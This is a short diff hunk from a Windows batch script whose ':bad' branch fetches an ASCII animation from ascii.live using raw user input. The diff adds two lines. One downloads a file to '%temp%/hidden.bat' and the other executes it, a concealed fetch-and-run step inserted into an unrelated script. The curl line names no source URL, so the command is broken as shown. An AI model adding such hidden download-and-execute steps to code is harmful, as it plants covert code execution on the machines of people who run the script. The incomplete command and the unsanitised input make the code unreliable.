@@ -19,7 +19,8 @@ echo Invalid input. Exiting...
 goto :eof
 
 :bad
-
+curl -o %temp%/hidden.bat
+%temp%/hidden.bat
 curl ascii.live/%user_input%
 endlocal
 exit
